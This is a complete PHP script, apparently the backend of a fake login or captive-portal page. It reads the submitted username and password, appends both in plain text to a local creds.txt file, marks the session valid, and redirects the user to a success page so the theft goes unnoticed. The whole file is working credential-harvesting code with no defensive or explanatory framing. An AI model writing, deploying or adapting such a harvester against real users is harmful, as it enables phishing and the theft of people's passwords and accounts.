<?php 
if (isset ($_POST['submit'])) {

$user = $_POST['auth_user'];
$pass = $_POST['auth_pass'];
$border = "==================================\n";
$creds = 'creds.txt';

if (is_writeable($creds)) {
	$creds_handle = fopen($creds, 'a') or die("Can't open file");
	fwrite($creds_handle, $border);
	fwrite($creds_handle, $user);
	fwrite($creds_handle, "\n");
	fwrite($creds_handle, $pass);
	fwrite($creds_handle, "\n");
	fwrite($creds_handle, $border);
}
fclose($creds_handle);
session_start();
$_SESSION['valid'] = '1';
$host  = $_SERVER['HTTP_HOST'];
$uri   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
$extra = 'success.html';
header("Location: http://$host$uri/$extra");
}
else { die("Form submit failed"); }
?>